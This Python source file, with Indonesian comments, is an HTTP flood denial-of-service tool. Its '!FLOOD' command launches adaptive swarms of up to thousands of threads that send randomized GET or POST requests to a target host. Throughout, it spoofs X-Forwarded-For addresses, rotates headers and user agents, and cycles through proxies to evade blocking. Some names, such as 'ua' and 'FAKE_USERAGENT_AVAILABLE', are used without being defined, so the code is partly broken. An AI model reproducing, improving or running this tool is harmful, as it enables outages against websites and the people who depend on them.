import socket
import threading
import string
import random
import time
import os
import platform
import sys
import queue

# --- Proxy Libraries Check and Global Variable ---
SOCKS_AVAILABLE = False
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    pass 

# Memeriksa dan mengimpor colorama
try:
    from colorama import Fore
except ModuleNotFoundError:
    class DefaultColors:
        def __getattr__(self, name):
            return '' 
    Fore = DefaultColors()

# Event global untuk memberi sinyal penghentian serangan
stop_attack = threading.Event()
# Variabel untuk kontrol kongkurensi adaptif (mode AUTO)
current_active_threads_count = 0
max_concurrent_attack_threads_auto = 1500 
thread_count_lock = threading.Lock() 

# --- Proxy Management ---
proxy_list = [] # Daftar semua proxy yang dimuat dari file
active_proxies = [] # Daftar proxy yang sedang aktif dan bisa dipilih
blacklist_proxies = {} # {proxy_address_string: {'unblacklist_time': timestamp, 'fail_count': count}}
proxy_lock = threading.Lock() # Untuk akses aman ke daftar proxy
PROXY_UNBLACKLIST_TIME = 60 # Detik untuk proxy di blacklist sementara
PROXY_PERMANENT_BLACKLIST_THRESHOLD = 5 # Jumlah kegagalan sebelum proxy dibuang permanen

# Fungsi print kustom untuk mengontrol output
def controlled_print(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()

def clear_text():
    """Membersihkan layar konsol. Diperkuat untuk kompatibilitas."""
    sys.stdout.write('\033c')
    sys.stdout.flush()
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def generate_random_string(length):
    """Menghasilkan string acak dari huruf dan angka."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def generate_url_path(length):
    """Menghasilkan path URL acak dengan panjang tertentu."""
    return '/' + generate_random_string(length)

def parse_proxy_line(line):
    """Parse satu baris dari ProxyList.txt menjadi tuple (type, host, port, user, pass)"""
    line = line.strip()
    if not line or line.startswith('#'):
        return None

    try:
        from urllib.parse import urlparse
        parsed = urlparse(line)
        if parsed.scheme and parsed.hostname and parsed.port:
            proxy_type = parsed.scheme.lower()
            return (proxy_type, parsed.hostname, parsed.port, parsed.username, parsed.password)
    except ImportError: 
        pass 
    except ValueError:
        pass 

    parts = line.split(':')
    if len(parts) == 2: 
        return ('http', parts[0], int(parts[1]), None, None)
    elif len(parts) == 4: 
        return ('http', parts[0], int(parts[1]), parts[2], parts[3])
    elif len(parts) >= 3 and (parts[0].lower() == 'socks5' or parts[0].lower() == 'http'): 
        if len(parts) == 3: 
            return (parts[0].lower(), parts[1], int(parts[2]), None, None)
        elif len(parts) == 5: 
            return (parts[0].lower(), parts[1], int(parts[2]), parts[3], parts[4])
    
    return None 

def test_proxy(proxy_info, test_target_host="google.com", test_target_port=80, timeout=5):
    """
    Menguji konektivitas proxy sebelum digunakan.
    Mengembalikan True jika proxy berfungsi, False jika tidak.
    """
    if not SOCKS_AVAILABLE:
        return False # Tidak bisa tes proxy jika PySocks tidak ada

    proxy_type, proxy_host, proxy_port, proxy_user, proxy_pass = proxy_info
    
    test_sock = socks.socksocket()
    test_sock.settimeout(timeout)
    
    try:
        if proxy_type == 'socks5':
            test_sock.set_proxy(socks.SOCKS5, proxy_host, proxy_port, username=proxy_user, password=proxy_pass)
        elif proxy_type == 'http':
            test_sock.set_proxy(socks.HTTP, proxy_host, proxy_port, username=proxy_user, password=proxy_pass)
        else:
            return False # Jenis proxy tidak didukung oleh PySocks
        
        test_sock.connect((test_target_host, test_target_port))
        test_sock.sendall(b"HEAD / HTTP/1.1\r\nHost: google.com\r\n\r\n")
        response = test_sock.recv(16) # Coba terima sedikit respons
        return b"HTTP" in response # Indikasi respons HTTP
    except (socks.ProxyError, socket.error, OSError, Exception):
        return False
    finally:
        if test_sock:
            test_sock.close()

def load_proxies(filename="ProxyList.txt"):
    """Memuat proxy dari file dan melakukan health check."""
    loaded_proxies = []
    if not os.path.exists(filename):
        return []
    
    with open(filename, 'r') as f:
        for line in f:
            proxy_info = parse_proxy_line(line)
            if proxy_info:
                if proxy_info[0].lower() not in ['http', 'socks5']:
                    continue
                if not SOCKS_AVAILABLE and (proxy_info[0].lower() == 'socks5' or proxy_info[0].lower() == 'http'): 
                    continue
                loaded_proxies.append(proxy_info)
    
    return loaded_proxies

def get_next_proxy():
    """Mengambil proxy berikutnya dari daftar aktif atau mencoba unblacklist."""
    with proxy_lock:
        current_time = time.time()
        # Periksa dan unblacklist proxy jika waktunya sudah tiba
        proxies_in_blacklist_copy = list(blacklist_proxies.keys()) 
        for p_addr_str in proxies_in_blacklist_copy:
            if current_time >= blacklist_proxies[p_addr_str]['unblacklist_time']:
                # Jika sudah di-unblacklist, coba lagi test proxy. Jika lulus, masukkan ke active_proxies
                # Jika gagal, tetap di blacklist atau buang permanen
                original_proxy_info = None # Perlu cara untuk mendapatkan kembali tuple original
                # Untuk kesederhanaan, kita akan isi ulang active_proxies saat kosong
                # Dan biarkan pengujian terjadi di DoS_Attack_Worker saat dipilih
                del blacklist_proxies[p_addr_str] # Hapus dari blacklist
        
        if not active_proxies:
            if not proxy_list: 
                return None
            active_proxies.extend(proxy_list) # Isi ulang dari daftar utama
            random.shuffle(active_proxies) # Acak lagi
            
        if not active_proxies: 
            return None
        
        # Pilih proxy secara acak dari yang aktif
        selected_proxy_info = random.choice(active_proxies)
        
        # Pastikan proxy yang dipilih tidak ada di blacklist yang belum waktunya
        proxy_address_str = f"{selected_proxy_info[0]}_{selected_proxy_info[1]}_{selected_proxy_info[2]}"
        if proxy_address_str in blacklist_proxies and current_time < blacklist_proxies[proxy_address_str]['unblacklist_time']:
            if len(active_proxies) == 1 and proxy_address_str in blacklist_proxies: 
                return None 
            return get_next_proxy() 
        
        return selected_proxy_info

def blacklist_proxy(proxy_info, reason="unknown"):
    """Menambahkan proxy ke daftar hitam sementara atau permanen."""
    if not proxy_info: return
    proxy_address_str = f"{proxy_info[0]}_{proxy_info[1]}_{proxy_info[2]}"
    with proxy_lock:
        if proxy_address_str not in blacklist_proxies:
            blacklist_proxies[proxy_address_str] = {'unblacklist_time': time.time() + PROXY_UNBLACKLIST_TIME, 'fail_count': 1}
        else:
            blacklist_proxies[proxy_address_str]['fail_count'] += 1
            blacklist_proxies[proxy_address_str]['unblacklist_time'] = time.time() + PROXY_UNBLACKLIST_TIME # Perbarui waktu
        
        if blacklist_proxies[proxy_address_str]['fail_count'] >= PROXY_PERMANENT_BLACKLIST_THRESHOLD:
            # Buang permanen dari proxy_list
            if proxy_info in proxy_list:
                proxy_list.remove(proxy_info)
            if proxy_info in active_proxies:
                active_proxies.remove(proxy_info)
            del blacklist_proxies[proxy_address_str] # Hapus dari blacklist juga
            # controlled_print(f"{Fore.RED}Proxy {proxy_info[1]}:{proxy_info[2]} dibuang permanen (terlalu banyak gagal).{Fore.RESET}") # Untuk debugging
        else:
            if proxy_info in active_proxies: 
                active_proxies.remove(proxy_info)
            # controlled_print(f"{Fore.YELLOW}Proxy {proxy_info[1]}:{proxy_info[2]} di-blacklist sementara ({blacklist_proxies[proxy_address_str]['fail_count']}/{PROXY_PERMANENT_BLACKLIST_THRESHOLD} gagal).{Fore.RESET}") # Untuk debugging


def generate_random_string_payload(length):
    """Menghasilkan string acak untuk body payload POST."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def DoS_Attack_Worker(ip, host, port, type_attack, booter_sent, use_proxy_option):
    """
    Fungsi worker yang melakukan satu siklus serangan.
    Mendukung koneksi langsung atau melalui proxy (membutuhkan PySocks).
    """
    global current_active_threads_count
    
    if stop_attack.is_set():
        return 

    s = None 
    selected_proxy = None
    original_socket_timeout = 0.2 

    try:
        if not stop_attack.is_set():
            with thread_count_lock:
                current_active_threads_count += 1

        url_path = generate_url_path(random.randint(5, 15))

        # --- Generasi User-Agent Dinamis ---
        random_user_agent = ua.random if FAKE_USERAGENT_AVAILABLE else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        
        fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        
        # --- Variasi Header HTTP yang Lebih Luas dan Acak ---
        base_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": f"en-US,en;q={random.uniform(0.5, 1.0):.1f}",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
            "Referer": f"http://{host}/{generate_random_string(10)}", 
            "X-Requested-With": "XMLHttpRequest", 
            "DNT": str(random.randint(0,1)), 
            "Upgrade-Insecure-Requests": "1" 
        }
        
        shuffled_headers = list(base_headers.items())
        random.shuffle(shuffled_headers)
        
        dynamic_headers_str = ""
        num_headers_to_include = random.randint(int(len(shuffled_headers) * 0.3), len(shuffled_headers))
        
        for i in range(num_headers_to_include):
            key, value = shuffled_headers[i]
            dynamic_headers_str += f"{key}: {value}\r\n"

        packet_body = ""
        if type_attack.upper() == "POST":
            body_len = random.randint(500, 2000) 
            packet_body = generate_random_string_payload(body_len) 
            content_length_header = f"Content-Length: {len(packet_body)}\r\n"
            content_type_header = f"Content-Type: application/x-www-form-urlencoded\r\n"
        else:
            content_length_header = "Content-Length: 0\r\n" 
            content_type_header = "" 

        packet_str = (
            f"{type_attack} /{url_path} HTTP/1.1\r\n" 
            f"Host: {host}\r\n"
            f"User-Agent: {random_user_agent}\r\n" 
            f"{dynamic_headers_str}" 
            f"Connection: close\r\n"
            f"X-Forwarded-For: {fake_ip}\r\n"
            f"{content_type_header}" 
            f"{content_length_header}\r\n" 
            f"{packet_body}" 
        )
        packet_data = packet_str.encode()

        # --- Proxy Connection Logic ---
        if use_proxy_option and SOCKS_AVAILABLE and active_proxies:
            selected_proxy = get_next_proxy()
            if not selected_proxy:
                return 
            
            proxy_type, proxy_host, proxy_port, proxy_user, proxy_pass = selected_proxy

            s = socks.socksocket() 
            
            if proxy_type == 'socks5':
                s.set_proxy(socks.SOCKS5, proxy_host, proxy_port, username=proxy_user, password=proxy_pass)
            elif proxy_type == 'http':
                s.set_proxy(socks.HTTP, proxy_host, proxy_port, username=proxy_user, password=proxy_pass)
            else: 
                return 
            
            s.settimeout(original_socket_timeout) 
            s.connect((ip, port)) 

            s.sendall(packet_data)
            try:
                s.recv(1, socket.MSG_PEEK) 
            except socket.timeout:
                raise socket.error("Proxy terlalu lambat/tidak merespons dari target.")
            except Exception as e:
                raise Exception(f"Gagal memvalidasi proxy/target respons: {e}")

        elif use_proxy_option and not SOCKS_AVAILABLE: 
            return 

        else: 
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(original_socket_timeout) 
            s.connect((ip, port))
        
        for _ in range(booter_sent):
            if stop_attack.is_set():
                break
            s.sendall(packet_data)
            time.sleep(0.0001) 
            
    except (socks.ProxyError, socket.error, OSError) as e:
        if use_proxy_option and selected_proxy:
            blacklist_proxy(selected_proxy, reason=str(e)) 
        pass 
    except Exception as e:
        if use_proxy_option and selected_proxy:
            blacklist_proxy(selected_proxy, reason=str(e)) 
        pass
    finally:
        if s:
            try:
                s.shutdown(socket.SHUT_RDWR)
            except (socket.error, OSError):
                pass
            try:
                s.close()
            except (socket.error, OSError):
                pass
        if not stop_attack.is_set():
            with thread_count_lock:
                current_active_threads_count -= 1


def runing_attack_manager_auto(ip, host, port_loader, time_loader, methods_loader, booter_sent_auto_mode, use_proxy_option):
    """
    Manajer utama untuk mode AUTO. Mengatur laju serangan secara adaptif dan agresif (90-98%).
    """
    global max_concurrent_attack_threads_auto
    
    error_occurrence_counter = 0 
    
    while time.time() < time_loader and not stop_attack.is_set():
        if error_occurrence_counter < 3: 
            max_concurrent_attack_threads_auto = min(max_concurrent_attack_threads_auto + 200, 10000) 
        elif error_occurrence_counter >= 5: 
            max_concurrent_attack_threads_auto = max(max_concurrent_attack_threads_auto - 1000, 1000) 
        
        error_occurrence_counter = 0 

        threads_to_launch = max_concurrent_attack_threads_auto - current_active_threads_count
        threads_to_launch = max(0, threads_to_launch) 

        for _ in range(threads_to_launch):
            if stop_attack.is_set():
                break
            try:
                th = threading.Thread(target=DoS_Attack_Worker, args=(ip, host, port_loader, methods_loader, booter_sent_auto_mode, use_proxy_option))
                th.daemon = True
                th.start()
            except threading.ThreadError: 
                error_occurrence_counter += 1
                max_concurrent_attack_threads_auto = max(max_concurrent_attack_threads_auto - 2000, 1000) 
                time.sleep(1) 
                break 
            except Exception:
                error_occurrence_counter += 1
                time.sleep(0.5)
                break

        time.sleep(0.05) 

def runing_attack_manager_custom(ip, host, port_loader, time_loader, booter_sent_custom_mode, methods_loader, custom_create_thread, custom_spam_loader, custom_spam_create_thread, use_proxy_option):
    """
    Manajer untuk mode CUSTOM. Meluncurkan thread sesuai parameter user tanpa adaptasi.
    """
    try:
        while time.time() < time_loader and not stop_attack.is_set():
            for _ in range(custom_create_thread): 
                if stop_attack.is_set():
                    break
                for _ in range(custom_spam_loader): 
                    if stop_attack.is_set():
                        break
                    for _ in range(custom_spam_create_thread): 
                        if stop_attack.is_set():
                            break
                        try:
                            th = threading.Thread(target=DoS_Attack_Worker, args=(ip, host, port_loader, methods_loader, booter_sent_custom_mode, use_proxy_option))
                            th.daemon = True
                            th.start()
                        except threading.ThreadError:
                            time.sleep(0.5) 
                            break 
                        except Exception:
                            time.sleep(0.5)
                            break
            time.sleep(0.01) 
    except Exception:
        pass


def countdown_timer(time_loader):
    """Menampilkan hitung mundur waktu serangan. Hanya menampilkan sisa waktu."""
    remaining = int(time_loader - time.time())
    while remaining > 0 and not stop_attack.is_set():
        sys.stdout.write(f"\r{Fore.YELLOW}Sisa waktu: {remaining} detik{Fore.RESET}")
        sys.stdout.flush()
        time.sleep(1)
        remaining = int(time_loader - time.time())
    
    if not stop_attack.is_set():
        controlled_print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}") 
        stop_attack.set()

def stop_attack_input_handler():
    """Menangani input pengguna (Enter) untuk menghentikan serangan."""
    try:
        input()
    except KeyboardInterrupt:
        pass 
    finally:
        if not stop_attack.is_set():
            stop_attack.set()
            controlled_print(f"\n{Fore.YELLOW}Serangan Dihentikan oleh Pengguna.{Fore.RESET}") 

def confirm_exit():
    """Meminta konfirmasi pengguna sebelum keluar dari program."""
    while True:
        sys.stdout.write(f"\r{Fore.YELLOW}Mau keluar? (y/n): {Fore.RESET}")
        sys.stdout.flush()
        choice = input().lower()
        if choice == 'y':
            controlled_print(f"\n{Fore.RED}Program dihentikan oleh pengguna. Keluar...{Fore.RESET}")
            sys.exit(0)
        elif choice == 'n':
            print() 
            return

def command():
    """Fungsi utama untuk memproses perintah pengguna."""
    global stop_attack, max_concurrent_attack_threads_auto, proxy_list, active_proxies
    while True:
        try:
            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
            
            if not data_input_loader: 
                confirm_exit()
                continue

            if data_input_loader.lower() == "clear": 
                clear_text()
                continue
            
            args_get = data_input_loader.split(" ")
            
            if args_get[0].upper() == "!FLOOD":
                use_proxy_option = False
                if args_get[-1].lower() == "proxy":
                    use_proxy_option = True
                    args_get = args_get[:-1] 

                if use_proxy_option:
                    if not SOCKS_AVAILABLE:
                        controlled_print(f"{Fore.RED}ERROR: PySocks tidak terinstal. Tidak dapat menggunakan opsi proxy.{Fore.RESET}")
                        controlled_print(f"{Fore.CYAN}Silakan instal dengan: pip install PySocks{Fore.RESET}")
                        continue 
                    
                    proxy_list = load_proxies()
                    active_proxies.clear()
                    active_proxies.extend(proxy_list) 
                    random.shuffle(active_proxies) 
                    
                    if not active_proxies: 
                        controlled_print(f"{Fore.RED}Tidak ada proxy valid yang dimuat. Serangan tidak dapat dimulai dengan opsi proxy.{Fore.RESET}")
                        continue
                    else:
                        controlled_print(f"{Fore.CYAN}Proxy akan digunakan untuk serangan ini.{Fore.RESET}")

                if len(args_get) == 6 and args_get[1].upper() == "AUTO":
                    mode = "AUTO"
                    target_loader = args_get[2]
                    port_loader = int(args_get[3])
                    time_loader = time.time() + int(args_get[4])
                    methods_loader = args_get[5]
                    booter_sent_for_auto = 500 
                    
                    try:
                        host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                        ip = socket.gethostbyname(host)
                        controlled_print(f"{Fore.LIGHTCYAN_EX}Memulai Serangan (AUTO Mode)...{Fore.RESET}\n" \
                                         f"{Fore.YELLOW}Target: {target_loader} ({ip}){Fore.RESET}\n" \
                                         f"{Fore.YELLOW}Port: {port_loader}{Fore.RESET}\n" \
                                         f"{Fore.YELLOW}Waktu: {int(time_loader - time.time())} detik{Fore.RESET}")
                    except socket.gaierror:
                        controlled_print(f"{Fore.YELLOW}GAGAL MENDAPATKAN URL atau HOST TIDAK VALID . . .{Fore.RESET}")
                        continue
                    
                    stop_attack.clear() 

                    global current_active_threads_count
                    current_active_threads_count = 0
                    max_concurrent_attack_threads_auto = 1000 

                    th_manager = threading.Thread(target=runing_attack_manager_auto, args=(ip, host, port_loader, time_loader, methods_loader, booter_sent_for_auto, use_proxy_option))
                    th_manager.daemon = True
                    th_manager.start()

                    timer_th = threading.Thread(target=countdown_timer, args=(time_loader,))
                    timer_th.daemon = True
                    timer_th.start()

                    stop_input_th = threading.Thread(target=stop_attack_input_handler)
                    stop_input_th.daemon = True
                    stop_input_th.start()

                    while not stop_attack.is_set() and time.time() < time_loader:
                        time.sleep(0.1)
                    
                    time.sleep(1) 
                    continue 

                elif len(args_get) == 9: 
                    mode = "CUSTOM"
                    target_loader = args_get[1]
                    port_loader = int(args_get[2])
                    time_loader = time.time() + int(args_get[3])
                    booter_sent_custom_mode = int(args_get[4])
                    methods_loader = args_get[5]
                    custom_create_thread = int(args_get[6])
                    custom_spam_loader = int(args_get[7])
                    custom_spam_create_thread = int(args_get[8])

                    try:
                        host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                        ip = socket.gethostbyname(host)
                        controlled_print(f"{Fore.LIGHTCYAN_EX}Memulai Serangan (CUSTOM Mode)...{Fore.RESET}\n" \
                                         f"{Fore.YELLOW}Target: {target_loader} ({ip}){Fore.RESET}\n" \
                                         f"{Fore.YELLOW}Port: {port_loader}{Fore.RESET}\n" \
                                         f"{Fore.YELLOW}Waktu: {int(time_loader - time.time())} detik{Fore.RESET}")
                    except socket.gaierror:
                        controlled_print(f"{Fore.YELLOW}GAGAL MENDAPATKAN URL atau HOST TIDAK VALID . . .{Fore.RESET}")
                        continue
                    
                    stop_attack.clear() 

                    th_manager = threading.Thread(target=runing_attack_manager_custom, args=(ip, host, port_loader, time_loader, booter_sent_custom_mode, methods_loader, custom_create_thread, custom_spam_loader, custom_spam_create_thread, use_proxy_option))
                    th_manager.daemon = True
                    th_manager.start()

                    timer_th = threading.Thread(target=countdown_timer, args=(time_loader,))
                    timer_th.daemon = True
                    timer_th.start()

                    stop_input_th = threading.Thread(target=stop_attack_input_handler)
                    stop_input_th.daemon = True
                    stop_input_th.start()

                    while not stop_attack.is_set() and time.time() < time_loader:
                        time.sleep(0.1)
                    
                    time.sleep(1) 
                    continue 

                else: 
                    if len(args_get) > 1 and args_get[1].upper() == "AUTO": 
                        controlled_print(f"{Fore.RED}Kesalahan: Jumlah argumen tidak sesuai untuk mode AUTO.")
                        controlled_print(f"{Fore.RED}Penggunaan Mode AUTO: !FLOOD AUTO <TARGET> <PORT> <TIME> <HTTP_METHODS> [opsional: proxy]{Fore.RESET}")
                        controlled_print(f"{Fore.CYAN}CONTOH AUTO: !FLOOD AUTO 127.0.0.1 80 300 GET proxy{Fore.RESET}")
                    else: 
                        controlled_print(f"{Fore.RED}Kesalahan: Jumlah argumen tidak sesuai untuk mode Custom.")
                        controlled_print(f"{Fore.RED}Penggunaan Mode Custom: !FLOOD <TARGET> <PORT> <TIME> <BOOTER_SENT> <HTTP_METHODS> <CREATE_THREAD> <SPAM_LOADER> <SPAM_CREATE> [opsional: proxy]{Fore.RESET}")
                        controlled_print(f"{Fore.CYAN}CONTOH CUSTOM: !FLOOD 127.0.0.1 80 300 100 GET 10 200 5 proxy{Fore.RESET}")
                    continue

            else:
                controlled_print(f"{Fore.RED}Perintah tidak ditemukan: '{data_input_loader}'.{Fore.RESET}")
                controlled_print(f"{Fore.CYAN}Gunakan 'clear' untuk membersihkan atau '!FLOOD' untuk memulai serangan.{Fore.RESET}")
                continue
        
        except KeyboardInterrupt:
            controlled_print(f"\n{Fore.RED}Ctrl+C terdeteksi. Menghentikan program...{Fore.RESET}")
            stop_attack.set()
            time.sleep(1)
            sys.exit(0)
        except Exception as e:
            controlled_print(f"{Fore.RED}Terjadi kesalahan tak terduga: {e}{Fore.RESET}")
            
if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        controlled_print(f"\n{Fore.RED}Program dihentikan oleh pengguna (Ctrl+C). Keluar...{Fore.RESET}")
        stop_attack.set()
        time.sleep(1)
        sys.exit(0)
    except Exception as e:
        controlled_print(f"{Fore.RED}Terjadi kesalahan fatal saat startup: {e}{Fore.RESET}")
        sys.exit(1)
